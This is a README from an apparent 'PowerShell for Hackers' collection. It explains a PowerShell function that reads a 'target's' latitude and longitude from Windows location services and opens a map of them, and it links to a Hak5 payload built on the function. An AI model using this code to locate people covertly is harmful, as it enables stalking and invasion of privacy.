![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#The-Function">The Function</a></li>
    <li><a href="#Examples">Examples</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# Get-GeoLocation

## Description

This function will get the geo-location of your target 

## The Function

### [Get-GeoLocation] 

Using the Geo-Watcher function you will get the location of your Target saved to the variable $GL

Longitude and Latitude will be saved individually to the the following variables $Lon and $Lat

```
function Get-GeoLocation{
	try {
	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
	$GeoWatcher.Start() #Begin resolving current locaton

	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
		Start-Sleep -Milliseconds 100 #Wait for discovery.
	}  

	if ($GeoWatcher.Permission -eq 'Denied'){
		Write-Error 'Access Denied for Location Information'
	} else {
		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
		
	}
	}
    # Write Error is just for troubleshooting
    catch {Write-Error "No coordinates found" 
    return "No Coordinates found"
    -ErrorAction SilentlyContinue
    } 

}
```
$GL will return something that looks like the following: 

```
Latitude  Longitude
--------  ---------
43.998350 -75.953510
```

```
$GL = Get-GeoLocation

$GL = $GL -split " "

$Lat = $GL[0].Substring(11) -replace ".$"

$Lon = $GL[1].Substring(10) -replace ".$"
```

Going a step further we can use [Start-Process] to open a tab in the browser with a map of their current location

by navigating to the following URL with the $Lon and $Lat variable plugged into it 

```
Start-Process "https://www.latlong.net/c/?lat=$Lat&long=$Lon"
```
That image will look something like this: 

![alt text](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/OMG/Payloads/OMG-We-Found-You/location.jpg)

<p align="right">(<a href="#top">back to top</a>)</p>


## Examples 

Listed below are payloads that have used one of these functions:

[We-Found-You](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-We-Found-You)


<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact

<div><h2>I am Jakoby</h2></div>
  <p><br/>
  
  <img src="https://media.giphy.com/media/VgCDAzcKvsR6OM0uWg/giphy.gif" width="50"> 
  
  <a href="https://github.com/I-Am-Jakoby/">
    <img src="https://img.shields.io/badge/GitHub-I--Am--Jakoby-blue">
  </a>
  
  <a href="https://www.instagram.com/i_am_jakoby/">
    <img src="https://img.shields.io/badge/Instagram-i__am__jakoby-red">
  </a>
  
  <a href="https://twitter.com/I_Am_Jakoby/">
    <img src="https://img.shields.io/badge/Twitter-I__Am__Jakoby-blue">
  </a>
  
  <a href="https://www.youtube.com/c/IamJakoby/">
    <img src="https://img.shields.io/badge/YouTube-I_am_Jakoby-red">
  </a>

  [Project Link](https://github.com/I-Am-Jakoby/PowerShell-for-Hackers)
</p>



<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [UberGuidoZ](https://github.com/UberGuidoZ)


<p align="right">(<a href="#top">back to top</a>)</p>
